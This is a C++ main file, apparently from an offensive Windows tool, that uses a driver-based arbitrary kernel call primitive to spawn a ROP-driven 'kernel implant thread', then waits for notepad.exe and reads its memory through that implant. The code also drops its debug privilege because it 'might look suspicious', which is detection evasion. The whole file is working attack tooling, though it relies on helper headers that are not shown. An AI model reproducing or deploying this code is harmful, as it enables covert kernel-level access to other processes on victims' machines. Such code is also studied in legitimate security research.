#include <numeric>
#include <iostream>
#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <include/globals.hpp>
#include <include/rop_thread/rop_thread.hpp>

#define TARGET_PROCESS_NAME "notepad.exe"

int main()
{
    // Required in our process starting from winver 24h2 to get
    // the kernel's module base, and system thread start addresses.
    if (!Utils::EnableDebugPrivilege())
    {
        throw std::runtime_error("Failed to enable debug privileges");
    }

    Globals::KernelBase = Driver::GetKernelModuleBase();
    if (!Globals::KernelBase)
    {
        throw std::runtime_error("Failed to find ntoskrnl.exe base");
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        throw std::runtime_error("Failed to find a random valid thread address");
    }

    // We no longer need this debug privilege, and it might
    // look suspicious if we have it so let's just disable it.
    Utils::DisableDebugPrivilege();

    Globals::WindowsBuild = Utils::GetWindowsBuildNumber();
    if (Globals::WindowsBuild == 0)
    {
        throw std::runtime_error("Failed to find the windows build being used");
    }

    std::printf("[+] Windows build: %d\n", Globals::WindowsBuild);
    std::printf("[+] Windows display version: %s\n", Utils::GetWindowsDisplayVersion().c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");
    RopThreadManager RopThread(KernelCaller);

    RopThread.SpawnThread();

    std::printf("[+] Kernel implant thread spawned\n");
    std::printf("[+] Awaiting target process\n");

    int TargetPid = 0;
    while (!TargetPid)
    {
        TargetPid = Utils::GetPidByName(TARGET_PROCESS_NAME);
        Sleep(100);
    }

    std::printf("[+] Target process pid %d\n", TargetPid);

    RopThread.SendTargetProcessPid(TargetPid);

    const std::uint64_t TargetProcessBase = RopThread.GetModuleBase(L"notepad.exe");

    void* ReadBuffer = RopThread.Read<void*>(TargetProcessBase);
    printf("[+] Read 8 bytes from process %s: 0x%p\n", TARGET_PROCESS_NAME, ReadBuffer);

    std::cin.get();

    return EXIT_SUCCESS;
}